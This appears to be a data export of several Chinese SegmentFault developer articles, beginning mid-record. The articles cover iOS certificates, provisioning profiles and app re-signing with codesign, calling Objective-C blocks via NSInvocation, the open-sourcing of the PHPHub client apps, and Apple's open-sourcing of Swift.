                    b2:0b:36:ac:f0:4b:fc:0a:f1:3c:de:96:a0:10:14:
                    aa:79
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            Authority Information Access: 
                OCSP - URI:http://ocsp.apple.com/ocsp03-wwdr01

            X509v3 Subject Key Identifier: 
                C7:AB:35:54:A3:7B:96:2A:67:55:B8:2F:B6:82:4B:B8:F0:49:0F:EB
            X509v3 Basic Constraints: critical
                CA:FALSE
            X509v3 Authority Key Identifier: 
                keyid:88:27:17:09:A9:B6:18:60:8B:EC:EB:BA:F6:47:59:C5:52:54:A3:B7

            X509v3 Certificate Policies: 
                Policy: 1.2.840.113635.100.5.1
                  User Notice:
                    Explicit Text: Reliance on this certificate by any party assumes acceptance of the then applicable standard terms and conditions of use, certificate policy and certification practice statements.
                  CPS: http://www.apple.com/certificateauthority/

            X509v3 Key Usage: critical
                Digital Signature
            X509v3 Extended Key Usage: critical
                Code Signing
            1.2.840.113635.100.6.1.2: critical
                ..
    Signature Algorithm: sha256WithRSAEncryption
        80:99:47:27:ae:e5:1e:89:1e:c2:ec:52:d7:c8:8b:df:86:25:
        a9:cb:b2:f2:01:6c:5e:a0:55:6c:ad:1d:bd:3b:1c:ce:b4:53:
        4d:03:d0:98:f6:f7:0e:24:2b:c5:cb:5e:71:88:bd:53:46:a8:
        c7:e0:d9:f4:81:47:98:a5:91:5c:04:f6:df:b9:c2:06:64:a4:
        73:3d:0b:78:0d:8b:11:29:d3:3a:ea:88:b7:97:a9:2a:e0:74:
        a9:0b:1f:91:0f:47:78:be:90:46:21:10:16:a5:4b:0d:a6:33:
        7e:0c:18:95:ba:7c:8e:b5:ed:86:5f:73:1b:cb:9e:ae:c8:96:
        9d:4f:12:0a:9b:43:cc:58:ca:f3:d5:f0:6e:19:a6:e9:bf:9d:
        95:34:39:4d:86:34:46:7e:11:e7:7c:9f:7b:1d:b1:9c:7d:1b:
        39:85:5f:77:b0:89:d4:bb:55:c3:a9:24:af:54:a6:42:47:bf:
        7c:d3:b0:6f:af:6a:2e:c6:00:07:1c:de:6b:aa:5b:a6:23:2b:
        fb:cd:2b:eb:04:fb:19:3e:1d:9d:ca:ae:d4:20:f1:4d:63:10:
        44:80:d1:cf:fd:82:51:d2:cd:77:cb:46:1e:bd:63:df:4f:82:
        c7:5d:b3:61:45:03:6b:84:35:17:4b:c6:16:f0:47:1f:7b:26:
        62:e3:d1:1b
</code></pre>
<p><code>Data</code>域即为证书的实际内容，与<code>Data</code>域平级的<code>Signature Algorithm</code>实际就是苹果的CA的公钥，而摘要的签名应该没有显示出来。Data域下一级的内容就是我的苹果账号信息，其中最为重要的是我的公钥，这个公钥与我本机的私钥是对应的。当我们双击安装完证书后，<code>KeyChain会自动将这对密钥关联起来</code>，所以在KeyChain中可以看到类似的效果：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004840321"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>后续在程序上真机的过程中，会使用这个私钥，对代码进行签名，而公钥会附带在<code>mobileprovision</code>文件中，打包进app。</p>
<blockquote><p>注意这里，公钥是附带在mobileprovision中的，并不是直接随代码打包的，所以，笔者认为，本质上在电脑上安装证书是没有实际用处的，因为mobileprovision是MC为我们生成的。之所以需要安装证书，是因为签名程序codesign或者Xcode，只能让我们选择“用哪个证书签名”，因为我们所选的证书还是会对应到私钥，真正用于签名的是私钥。mobileprovision和代码签名在后面详细说明。</p></blockquote>
<p>所以，<code>就算你有证书，但是如果没有对应的私钥是没有用的</code>。那么有人要问了，既然私钥只有某台电脑生成的，那么团队开发怎么展开呢？</p>
<h2>团队开发</h2>
<p>于是，大家会去搜索“iOS证书共享”之类的关键字，给出的解决方案就是“私钥导出”。没错，既然问题的关键是私钥，我们共享私钥不就行了，将最初申请证书的机器的私钥导出成.p12文件，并让其他机器导入，同时其他机器也应该安装下载下来的证书。</p>
<p>当然还有一种方案，就是每台机器都各自去申请各自的证书。然而这样做可能到后面比较混乱。</p>
<p>由于iOS证书有多种类型，用于不同的用处，所以我们可能后续还会去MC上申请别的证书。所以强烈建议<code>CertificateSigningRequest.certSigningRequest</code>需要保留，因为如果再次生成<code>CertificateSigningRequest.certSigningRequest</code>文件，可能就是对应另一个私钥了！还需要在共享一次私钥，会比较麻烦。</p>
<h2>iOS证书类型</h2>
<p>当我们在MC的申请证书界面点击新建证书时，需要选择一种证书。每种证书有不同的用处，就好比你要生孩子，那么得有准生证；你要驾驶机动车，需要驾驶证；你要出国，需要护照...那么在iOS开发中涉及的证书究竟有什么区别呢？本质上他们的区别只是用途，从证书结构上讲都是同一个，只要你不改变申请用的<code>CertificateSigningRequest.certSigningRequest</code>文件，这些证书中包含的公钥和对应的私钥都是同一个。接下来罗列几个常用的证书类型：</p>
<ol>
<li><p>iOS App Development。开发、真机调试用</p></li>
<li><p>Apple Push Notification service SSL (Sandbox)。开发阶段使用苹果的推送服务</p></li>
<li><p>App Store and Ad Hoc。上架和AdHoc方式发布时用</p></li>
<li><p>Apple Push Notification service SSL (Production)。上架后使用苹果推送服务</p></li>
<li><p>In-House。企业版发布，需$299才能拥有，还需邓氏编码</p></li>
</ol>
<p>其他不常用的就不列举了。关于<code>AdHoc</code>方式，在后面的<code>mobileprovision</code>中再说。</p>
<h1>iOS授权和描述文件</h1>
<p>但是光有证书并不够解决苹果的“后顾之忧”，证书能够证明app的所属以及app的完整性，保证app本身是安全的。但是，却不能细化到app所使用的某些服务是被苹果认可的，比如APN推送服务。而且证书无法限制调试版的app的装机规模。于是，苹果想出了“花式作死”的<code>mobileprovision</code>。你可以使用如下命令查看一个<code>mobileprovision</code>：</p>
<pre><code>security cms -D -i embedded.mobileprovision
</code></pre>
<p><code>mobileprovision</code>文件包含：</p>
<ol>
<li><p>AppId。每个app必须在MC中创建一个对应的AppId。规则不累述了。</p></li>
<li><p>使用哪些证书。上面说了，不同类型的证书就代表了不同的发布方式，还包括一些功能的能否使用（比如APN）</p></li>
<li><p>功能授权列表</p></li>
<li><p>可安装的设备列表。对于AdHoc方式发布的app或者真机调试时，会有一个列表，这个列表里面是iOS设备的UDID，每台iOS设备出厂的UDID都不同，所以可以用来标识设备。可通过iTunes连接设备，或者<a href=""http://fir.im/udid"" rel=""nofollow noreferrer""></a><a href=""http://fir.im/udid"" rel=""nofollow noreferrer"">http://fir.im/udid</a>这里获取</p></li>
<li><p>苹果的签名！</p></li>
</ol>
<p>注意<code>5</code>，<code>这里的签名是苹果签的</code>，跟我们的私钥没有关系。也就是说<code>mobileprovision</code>文件是苹果签名的，我们除了从MC中获取，别无他法。也不能再获取后随意篡改（比如添加别的设备）。因此上面的1-4就被苹果牢牢的控制在手里，所有的规则都必须由苹果来制定和约束。</p>
<h2>AdHoc发布和真机调试</h2>
<p>AdHoc允许将测试版app发布给有限的设备安装，而无需通过appstore的审核。这里的关键是如何控制哪些设备可以装。答案就是<code>mobileprovision</code>文件，记得你在生成<code>mobileprovision</code>文件的时候需要选设备的UDID吧，所以这些设备需要事先添加到MC的<code>Devices</code>里面。对于开发时候的真机调试，原理差不多。都是通过<code>mobileprovision</code>的条目<code>4</code>来做到的。而苹果对于调试和测试用机的数量限制为100台！</p>
<h1>iOS代码签名</h1>
<p>很多人研究到上面也就停止了，然而生命不息，作死不止。上面很多次提到代码签名，那么究竟代码是如何签名的。这对于可能需要做自动签名发布的企业或团队是必须了解的。另外，你可能还需要去阅读<a href=""https://github.com/maciekish/iReSign"" rel=""nofollow noreferrer"">iReSign</a>的源码。</p>
<h2>ipa的组成</h2>
<p>iOS程序最终都会以.ipa文件导出，先来了解一下ipa文件的结构：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008382125?w=796&amp;h=434"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>事实上，ipa文件只是一个zip包，可以使用如下命令解压：</p>
<pre><code>/usr/bin/unzip -q xxx.ipa -d &lt;destination&gt;
</code></pre>
<p>解压后，得到上图的Payload目录，下面是个子目录，其中的内容如下：</p>
<ol>
<li><p>资源文件，例如图片、html、等等。</p></li>
<li><p>_CodeSignature/CodeResources。这是一个plist文件，可用文本查看，其中的内容就是是程序包中（不包括Frameworks）所有文件的签名。注意这里是<code>所有文件</code>。意味着你的程序一旦签名，就不能更改其中任何的东西，包括资源文件和可执行文件本身。iOS系统会检查这些签名。</p></li>
<li><p>可执行文件。此文件跟资源文件一样需要签名。</p></li>
<li><p>一个mobileprovision文件.打包的时候使用的，从MC上生成的。</p></li>
<li><p>Frameworks。程序引用的非系统自带的Frameworks，每个Frameworks其实就是一个app，其中的结构应该和app差不多，也包含签名信息CodeResources文件</p></li>
</ol>
<h2>相关的程序和命令</h2>
<p>一般我们会用Xcode自带的archive功能来打包ipa和签名，实际上xcode只不过是调用了一些外部程序完成了工作，如果我们有朝一日需要自己实现自动化的签名流程，就需要了解究竟相关的程序和命令有哪些。</p>
<p>用下面命令，列出系统中可用于签名的有效证书：</p>
<pre><code>/usr/bin/security find-identity -v -p codesigning

1) E056929276F94152F3FDF0EA84BD2B06396F2DDD ""iPhone Developer: Liang Ding (2U967A2YJ6)""
2) 7C608F653A989E95E1A4D303EC4E6625D95EEB42 ""iPhone Distribution: Liang Ding (7XPNRZE9TC)""
  2 valid identities found
  </code></pre>
<p>可以看到这个命令列出了一个字符串标示的证书名称，如：iPhone Developer: Liang Ding (2U967A2YJ6)。这个名称后面会用到的。</p>
<p>使用如下命令对xxx.app目录签名，codesign程序会自动将其中的文件都签名，（Frameworks不会自动签）：</p>
<pre><code>/user/bin/codesign -fs ""iPhone Developer: Liang Ding (2U967A2YJ6)"" --no-strict Payload/xxx.app
</code></pre>
<p>对于每个Framework，也需要使用这个命令签名，上面说了Framework的结构跟app其实差不多，所以签名命令类似。这个命令会自动找到证书相关的私钥。-f表示对于已经签名的app强制重签。</p>
<p>最后用下面命令校验签名是否合法：</p>
<pre><code>/usr/bin/codesign -v xxx.app
</code></pre>
<p>如果没有任何输出说明没有问题。</p>
<p>使用<code>zip</code>命令重新打包成ipa包</p>
<pre><code>/usr/bin/zip -qry destination source
</code></pre>
<h2>对app重新签名的流程</h2>
<p>如果要设计一个自动化的重签程序，大致需要这么个流程：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008382126?w=483&amp;h=809"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<ol>
<li><p>首先解压ipa</p></li>
<li><p>如果mobileprovision需要替换，替换</p></li>
<li><p>如果存在<code>Frameworks</code>子目录，则对.app文件夹下的所有Frameworks进行签名，在Frameworks文件夹下的<code>.dylib</code>或<code>.framework</code></p></li>
<li><p>对xxx.app签名</p></li>
<li><p>重新打包</p></li>
</ol>
<h1>iOS设备如何验证app是否合法</h1>
<p>关键的几个点：</p>
<ol>
<li><p>解压ipa</p></li>
<li>
<p>取出<code>embedded.mobileprovision</code>，通过签名校验是否被篡改过</p>
<ol>
<li><p>其中有几个证书的公钥，其中开发证书和发布证书用于校验签名</p></li>
<li><p>BundleId</p></li>
<li><p>授权列表</p></li>
</ol>
</li>
<li><p>校验所有文件的签名，包括Frameworks</p></li>
<li><p>比对Info.plist里面的BundleId是否符合<code>embedded.mobileprovision</code>文件中的</p></li>
</ol>
<h1>总结</h1>
<p>非对称密钥算法是基石，本文比较详细的阐述了非对称加密算法和摘要算法，并逐渐引出数字签名和数字证书。理解非对称密钥算法是关键。</p>
<p>苹果通过证书来授权开发者开发iOS应用，不同的证书具有不同的用处，建议申请时使用相同的请求文件（即保证私钥统一）。可以通过共享私钥的方式让团队使用相同的私钥和证书，已方便开发。为了保证app的安全性，app中所有的文件都会被签名，这样，签过名的app除非重新签名，否则无法改动其中的任何东西。</p>
<p><code>mobileprovision</code>是一个配置文件，由苹果签名并发布给开发者。配置文件是一组信息的集合，这组信息决定了某一个应用是否能够在某一个特定的设备上运行。配置文件可以用于让应用在你的开发设备上可以被运行和调试，也可以用于内部测试 (ad-hoc) 或者企业级应用的发布。有了配置文件，苹果对开发者的约束就十分稳固了。</p>
<p>所以，证书（及其对应的私钥）和配置文件是签名和打包的两个必要文件。必须深刻理解，才能在日常的错误中找到解决办法。</p>
<p>更多内容可参考这几篇：</p>
<p><a href=""https://www.objc.io/issues/17-security/inside-code-signing/"" rel=""nofollow noreferrer"">Inside Code Signing</a></p>
<p><a href=""http://objccn.io/issue-17-2/"" rel=""nofollow noreferrer"">代码签名探析</a></p>
<p><a href=""http://www.cocoachina.com/ios/20141017/9949.html"" rel=""nofollow noreferrer"">iOS Code Signing 学习笔记</a></p>

                ", 漫谈iOS程序的证书和签名机制,1531972073,114,1,486,1,1,https://segmentfault.com/a/1190000004144556
128,1,0,6,"
                    
<h2>起</h2>
<p>一日在开发之中，遇到这样一个问题，在某些场合，需要用NSInvocation来调用Block，而Block签名并不是固定，即，Block参数类型个数可以不同。</p>
<h2>问题</h2>
<h3>回忆NSInvocation 一般用法</h3>
<p>自然想到了NSInvocation，譬如如下代码：</p>
<pre><code>NSString* string = @""Hello"";
NSString* anotherString = [string stringByAppendingString:@"" World!""];</code></pre>
<p>写成Invocataion大致是这样的：</p>
<pre><code>NSString* string = @""Hello"";
NSString* anotherString;
NSString* stringToAppend = @"" World!"";
NSInvocation* inv = [NSInvocation invocationWithMethodSignature:[NSString instanceMethodSignatureForSelector:@selector(stringByAppendingString:)]];
inv.target = string;
[inv setArgument:&amp;stringToAppend atIndex:2];
[inv invoke];
[inv getReturnValue:&amp;anotherString];</code></pre>
<p>具体就不详细介绍了，文档里讲得很详细。请移步<a href=""https://developer.apple.com/library/ios/documentation/Cocoa/Reference/Foundation/Classes/NSInvocation_Class/index.html#//apple_ref/occ/cl/NSInvocation"" rel=""nofollow noreferrer"">Apple Doc</a></p>
<h3>MethodSignature</h3>
<p>一个问题是如何Block获得MethodSignature。Block没有selector，但发现NSMethodSignature有这样一个方法<code>-[NSMethodSignature signatureWithObjCTypes:]</code>，那问题转化成如何从Block获得编码的Signature。</p>
<p>一搜索。发现<a href=""http://clang.llvm.org/docs/Block-ABI-Apple.html"" rel=""nofollow noreferrer"">Clang官方文档</a>和<a href=""http://stackoverflow.com/questions/9048305/checking-objective-c-block-type"" rel=""nofollow noreferrer"">stackoverflow</a>都有说这个问题。(Clang官方文档真是个宝库啊)。</p>
<p>按Clang的文档，Block定义如下：</p>
<pre><code>struct Block_literal_1 {
    void *isa; // initialized to &amp;_NSConcreteStackBlock or &amp;_NSConcreteGlobalBlock
    int flags;
    int reserved;
    void (*invoke)(void *, ...);
    struct Block_descriptor_1 {
    unsigned long int reserved;     // NULL
    unsigned long int size;         // sizeof(struct Block_literal_1)
    // optional helper functions
    // void (*copy_helper)(void *dst, void *src);     // IFF (1&lt;&lt;25)
    // void (*dispose_helper)(void *src);             // IFF (1&lt;&lt;25)
    // required ABI.2010.3.16
    // const char *signature;                         // IFF (1&lt;&lt;30)
    void* rest[1];
    } *descriptor;
    // imported variables
};</code></pre>
<p>中间注释部分是对做了些小改造，因为对于可以copy的Block，上述两个函数指针才存在。（另外，发现其实Block还能通过<code>block-&gt;invoke(...)</code>来调用，先按下不表）。</p>
<pre><code>static const char *__BlockSignature__(id blockObj)
{
    struct Block_literal_1 *block = (__bridge void *)blockObj;
    struct Block_descriptor_1 *descriptor = block-&gt;descriptor;
    int copyDisposeFlag = 1 &lt;&lt; 25;
    int signatureFlag = 1 &lt;&lt; 30;
    assert(block-&gt;flags &amp; signatureFlag);
    int offset = 0;
    if(block-&gt;flags &amp; copyDisposeFlag)
        offset += 2;
    return (const char*)(descriptor-&gt;rest[offset]);
}

NSInvocation * invocation = [NSInvocation invocationWithMethodSignature:[NSMethodSignature signatureWithObjCTypes:__BlockSignature__(block)]];</code></pre>
<p>最重要的一个问题解决了。之后就是对invocation调用setArgument，进行参数传递。（先简化一下问题，参数都是NSObject，放在NSArray里,关于参数获取后面还有坑，以后再写）</p>
<pre><code>    for(NSUInteger i = 0; i &lt; args.count ; ++i){
        id object = args[i];
        [invocation setArgument:&amp;object atIndex:i + 2];
    }
    [invocation invokeWithTarget:block];</code></pre>
<p>调用，Crash！越界了</p>
<blockquote><p>Reason: -[NSInvocation setArgument:atIndex:]: index (5) out of bounds [-1, 4]</p></blockquote>
<p>文档是这样描述<code>setArgument</code>的</p>
<blockquote><p>Indices 0 and 1 indicate the hidden arguments self and _cmd, respectively; these values can be retrieved directly with the target and selector methods. Use indices 2 and greater for the arguments normally passed in a message.</p></blockquote>
<p>其实上述代码问题很多，刚才有点<a href=""http://coolshell.cn/articles/2058.html"" rel=""nofollow noreferrer"">撞大运编程</a></p>
<ol>
<li><p>selector(即<code>_cmd</code>)哪里去了？并没有传递给NSInvocation</p></li>
<li><p>为什么越界，按照文档说法应该从2开始。</p></li>
<li><p>为什么从-1开始</p></li>
</ol>
<p>文档说的言之凿凿，第一个参数传self，第二个是selector(即<code>_cmd</code>)，但block调用并没有selector，参数个数其实可以从MethodSignature获取：<code>invocation.methodSignature.numberOfArguments</code></p>
<p>所以这就是会越界的原因，正确的做法是从1开始：</p>
<pre><code>[invocation setArgument:&amp;object atIndex:i + 1]</code></pre>
<p>一调试，果然。</p>
<blockquote><p>另外从-1开始原因是-1的位置是存储return result，当然这个结论我查了文档并没有找到，也是试出来的。囧。</p></blockquote>
<h2>源码及其他</h2>
<p>源码我放在了github，戳<a href=""https://github.com/deput/NSInvocation-Block"" rel=""nofollow noreferrer"">这里</a></p>
<p>用法也很简单：</p>
<pre><code>NSInvocation* inv = [NSInvocation invocationWithBlock:block];</code></pre>
<p>后续会增加一些接口如：<br><code>+ (instancetype) invocationWithBlockAndArguments:(id) block ,...;</code></p>
<h2>更新</h2>
<p>恩 已经增加了。</p>
<p>增加的接口用法：<br>对于</p>
<pre><code>void (^myBlock)(id, NSArray*,double, int**) = ^(id obj1, NSArray* array, double dNum,int** pi) {
  NSLog(@""%@"",@""Hey!"");
};</code></pre>
<pre><code>int* i = NULL;
NSInvocation* inv = [NSInvocation invocationWithBlockAndArguments:myBlock,[NSObject new],@[@1,@2,@3],1.23,&amp;i];</code></pre>
<p>参数支持<code>id</code>,所有简单值类型,<code>IMP</code>,<code>SEL</code>,<code>Class</code>,<code>Block</code>,<code>指针</code>, 但Struct,Union,C-style Array 不支持，比较预想的tricky，研究中。</p>
<p>原作写于segmentfault <a href=""http://segmentfault.com/a/1190000004141249"" rel=""nofollow noreferrer"">链接</a></p>

                ", Objective-C runtime 拾遗 （一）——NSInvocation 调用Block,1531972075,424,1,494,1,1,https://segmentfault.com/a/1190000004141249
129,1,0,6,"
                    
<h2>说明</h2>
<p>趁着 <a href=""http://v2ex.com/t/221201"" rel=""nofollow noreferrer"">团队寻找新项目</a> 的时间空隙, <a href=""http://est-group.org/"" rel=""nofollow noreferrer"">我们团队</a> 作为练手, 为 PHPHub 做了 iOS 和 Android 客户端, 并开源, 供大家互相学习参考, 欢迎各种提 issue 和 pr ;-)</p>
<h4>PHPHub related projects</h4>
<ul>
<li><p><a href=""https://github.com/Aufree/phphub-ios"" rel=""nofollow noreferrer"">PHPHub-iOS</a> by <a href=""https://github.com/Aufree"" rel=""nofollow noreferrer"">@Aufree</a></p></li>
<li><p><a href=""https://github.com/NauxLiu/phphub-server"" rel=""nofollow noreferrer"">PHPHub-Server</a> by <a href=""https://github.com/NauxLiu"" rel=""nofollow noreferrer"">@NauxLiu</a></p></li>
<li><p><a href=""https://github.com/CycloneAxe/phphub-android"" rel=""nofollow noreferrer"">PHPHub-Android</a> by <a href=""https://github.com/CycloneAxe"" rel=""nofollow noreferrer"">@Kelvin</a> and <a href=""https://github.com/xiaoxiaoyu"" rel=""nofollow noreferrer"">@Xiaoxiaoyu</a></p></li>
<li><p><a href=""https://github.com/phphub/phphub-ui"" rel=""nofollow noreferrer"">PHPHub-UI</a> by <a href=""https://github.com/phphub/phphub-ui"" rel=""nofollow noreferrer"">@Summer</a> and <a href=""https://github.com/aufree"" rel=""nofollow noreferrer"">@Aufree</a></p></li>
<li><p><a href=""https://github.com/summerblue/phphub"" rel=""nofollow noreferrer"">PHPHub-Web</a> by <a href=""https://github.com/phphub/phphub-ui"" rel=""nofollow noreferrer"">@Summer</a></p></li>
</ul>
<h2>iOS</h2>
<p>PHPHub for iOS 是 PHPHub 的官方 iOS 客户端, 完美适配 iPhone 和 iPad, 兼容 iOS 8, 使用了最新的 PHPHub API, 支持 APNS, 全屏广告, 扫描登录等功能, 集成了 Google Analytics, Crashlytics , JPush, UMeng 等众多第三方服务.</p>
<h3>iPhone 预览图</h3>
<p><span class=""img-wrap""><img data-src=""http://7fvhf5.com1.z0.glb.clouddn.com/phphub-iphone.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h3>iPad 预览图</h3>
<p><span class=""img-wrap""><img data-src=""http://ww4.sinaimg.cn/large/006fiYtfgw1exknd0wca7j31kw1ff4b8.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>中文文档: <a href=""http://aufree.github.io/phphub-ios/"" rel=""nofollow noreferrer"">http://aufree.github.io/phphub-ios/</a> <br>GitHub 地址: <a href=""https://github.com/Aufree/phphub-ios"" rel=""nofollow noreferrer"">https://github.com/Aufree/phphub-ios</a></p>
<h2>Android</h2>
<p>PHPHub for Android 为 PHPHub Android 客户端, 项目采用 MVP 模式架构, RxJava 处理 API 请求返回数据, 实现了二维码扫描登录, 消息提醒, 选项卡切换等功能 </p>
<p><span class=""img-wrap""><img data-src=""https://cloud.githubusercontent.com/assets/324764/10683969/448b0cda-797a-11e5-8f93-3e51ad7144df.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>GitHub 地址: <a href=""https://github.com/CycloneAxe/phphub-android"" rel=""nofollow noreferrer"">https://github.com/CycloneAxe/phphub-android</a></p>
<h2>Server</h2>
<p>PHPHub for Server 是使用 Laravel 5.1 开发的一套 PHPHub 社区的 API 接口, 遵循 Symfony 代码规范, 使用 Homestead 环境作为开发环境 </p>
<p>GitHub 地址: <a href=""https://github.com/NauxLiu/phphub-server"" rel=""nofollow noreferrer"">https://github.com/NauxLiu/phphub-server</a></p>
<h2>Web</h2>
<p>PHPHub 是一个用 Laravel 写的 PHP &amp; Laravel 开发者社区, 该社区自去年 8 月份上线以来便吸引了众多 Laravel 开发者到上面参与技术讨论, 组织翻译了包括 php-the-right-way, Lumen, Laravel 等文档, 同时成为多个 Composer 安装包的首发地 </p>
<p><span class=""img-wrap""><img data-src=""http://ww2.sinaimg.cn/large/76dc7f1bjw1eyl2mlam9uj21kw113tli.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>官网: <a href=""https://phphub.org/"" rel=""nofollow noreferrer"">https://phphub.org/</a> <br>GitHub: <a href=""https://github.com/summerblue/phphub"" rel=""nofollow noreferrer"">https://github.com/summerblue/phphub</a></p>
<h2>UI</h2>
<p>PHPHub UI 是 PHPHub iOS 和 Android 应用的设计稿, 设计稿包括界面, Banner, 应用空视图, Apple Reviews 设计图等 </p>
<p><span class=""img-wrap""><img data-src=""http://ww4.sinaimg.cn/large/76dc7f1bjw1eyl2qxh67sj21kw0zxdym.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span><br><span class=""img-wrap""><img data-src=""http://ww1.sinaimg.cn/large/76dc7f1bjw1eyl2rce5vbj21kw0zxk09.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span><br><span class=""img-wrap""><img data-src=""http://ww2.sinaimg.cn/large/76dc7f1bjw1eyl2rozbezj21kw0zx7f9.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>GitHub 地址: <a href=""https://github.com/phphub/phphub-ui"" rel=""nofollow noreferrer"">https://github.com/phphub/phphub-ui</a></p>
<h2>应用下载地址</h2>
<blockquote>
<p>Android 下载链接: <a href=""http://fir.im/phphub"" rel=""nofollow noreferrer"">http://fir.im/phphub</a> </p>
<p>iOS 下载链接: <a href=""https://itunes.apple.com/us/app/phphub-ji-ji-xiang-shang-php/id1052966564"" rel=""nofollow noreferrer"">https://itunes.apple.com/us/app/phphub-ji-ji-xiang-shang-php/id1052966564</a></p>
</blockquote>
<p>Made With Love  By <a href=""http://est-group.org/"" rel=""nofollow noreferrer"">The EST Group</a>.</p>

                "," PHPHub 所有项目正式开源! (包括 iOS, Android, Web, Server, UI)",1531972076,338,1,338,1,1,https://segmentfault.com/a/1190000004097502
130,1,0,6,"
                    
<blockquote><p>""Welcome to Swift!""</p></blockquote>
<p>Swift 语言自去年发布以来，就成为了历史上发展最快的编程语言之一。本周四，Swift 团队宣布 Swift 编程语言正式开源，一同开源的还有 Swift 核心库及包管理器。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVrlHS"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>作为介绍文章，本文主要包括本次 Swift 开源项目的基本介绍和 SegmentFault 社区优质 Swift 资源汇总。</p>
<h2>Swift Documentation</h2>
<blockquote><p>GitHub Swift 项目地址：<a href=""https://github.com/apple/swift"" rel=""nofollow noreferrer"">https://github.com/apple/swift</a>（目前已过万 star）</p></blockquote>
<p>Swift 由多种不同的项目组成，提供一个构建软件的完整生态系统，由 Objective-C 和许多其他语言启发而生，但它本身并不是一个「C-衍生语言」。Swift 编译器项目解析 Swift 语法， 产生语义判断来帮助编写正确代码，利用 LLVM 生成机器指令。LLDB 项目是 first-class 调试器，包含一个 REPL 进行交互编程。Swfit 标准库项目包含所有核心类型和基础函数。</p>
<p>从文档构建开始上手 Swift：</p>
<ol>
<li><p>首先安装 <a href=""http://sphinx-doc.org"" rel=""nofollow noreferrer"">Sphinx 文档生成器</a>（在命令行直接运行 <code>easy_install -U Sphinx</code> 即可），然后就可以进入 <code>docs</code>，通过 <code>make</code> 命令来构建 Swift 文档。这样会将 <code>docs</code> 目录下的 <code>.rst</code> 直接编译进 <code>docs/_build/html</code> 里的 HTML 文件。</p></li>
<li><p>文档构建之后，就可以通过 <code>docs/_build/html/whitepaper/index.html</code> 开始上手 Swift。你也可以阅读 <code>docs/LangRef</code>，从实现角度了解 Swift 是如何工作的。其实 <code>docs</code> 中的很多文档已经过时了 ╮(╯_╰)╭ ，当然最好的文档还是标准库（<code>stdlib</code>）啦~</p></li>
</ol>
<p>之后，你就可以开始你的 Swift 之路了：<a href=""https://github.com/apple/swift#swift-programming-language"" rel=""nofollow noreferrer"">https://github.com/apple/swift#swift-programming-language</a></p>
<p>另外，这里还有一些 Swift 相关的项目推荐，你也可以看一下：</p>
<pre><code>git clone git@github.com:apple/swift.git swift
git clone git@github.com:apple/swift-llvm.git llvm
git clone git@github.com:apple/swift-clang.git clang
git clone git@github.com:apple/swift-lldb.git lldb
git clone git@github.com:apple/swift-cmark.git cmark
git clone git@github.com:apple/swift-llbuild.git llbuild
git clone git@github.com:apple/swift-package-manager.git swiftpm
git clone git@github.com:apple/swift-corelibs-xctest.git
git clone git@github.com:apple/swift-corelibs-foundation.git</code></pre>
<p>除了开源 Swift 之外，Swift 团队今天还开源了另外一些相关的重要项目，其中包括 Swift 核心库和全新的 Swift 包管理器。</p>
<h3>Swift 包管理器</h3>
<p>Swift 包管理器是一个全新的项目，通过创建一个强大、用户友好的工具来构建和共享 Swift 代码，不过目前还处于早期开发阶段。 </p>
<p>GitHub 项目：<a href=""https://github.com/apple/swift-package-manager"" rel=""nofollow noreferrer"">apple/swift-package-manager</a></p>
<h3>Swift 核心库</h3>
<p>Swift 核心库项目是更高级别的 APIs 集合，基于 Swift 标准库而成，这些库提供的函数有：定位、网络基元、单元测试、用户参数等，此外还提供编码规范。</p>
<p>核心库基于 Apple 平台的框架命名分别为：Foundation，libdispatch 和 XCTest。</p>
<p>GitHub 项目：</p>
<ul>
<li><p><a href=""https://github.com/apple/swift-corelibs-foundation"" rel=""nofollow noreferrer"">apple/swift-corelibs-foundation</a></p></li>
<li><p><a href=""https://github.com/apple/swift-corelibs-xctest"" rel=""nofollow noreferrer"">apple/swift-corelibs-xctest</a></p></li>
<li><p><a href=""https://github.com/apple/swift-corelibs-libdispatch"" rel=""nofollow noreferrer"">apple/swift-corelibs-libdispatch</a></p></li>
</ul>
<h2>社区优质 Swift 资源</h2>
<p>SegmentFault 社区现已有大量和 Swift 相关的优质内容，此处给大家推荐部分。</p>
<h3>文章</h3>
<ul>
<li><p><a href=""http://segmentfault.com/a/1190000000532286"" rel=""nofollow noreferrer"">《杂谈 Apple Swift》</a> by RobinQu</p></li>
<li><p><a href=""http://segmentfault.com/a/1190000002922232"" rel=""nofollow noreferrer"">《Swift 2.0 初探》</a> by DevTalking</p></li>
<li><p><a href=""http://segmentfault.com/a/1190000002421100"" rel=""nofollow noreferrer"">《Swift 中的文件和初始化》</a></p></li>
<li><p><a href=""http://segmentfault.com/a/1190000002421122"" rel=""nofollow noreferrer"">《在 Swift 中使用 C 语言的指针》</a></p></li>
<li><p><a href=""http://segmentfault.com/a/1190000002421145"" rel=""nofollow noreferrer"">《在 Swift 中构建布尔类型》</a></p></li>
<li><p><a href=""http://segmentfault.com/a/1190000002907377"" rel=""nofollow noreferrer"">《Swift 新特性 - 访问控制（Access Control）》</a></p></li>
<li><p><a href=""http://segmentfault.com/a/1190000003822838"" rel=""nofollow noreferrer"">《Swift 中的泛型编程》</a> by 王下邀月熊</p></li>
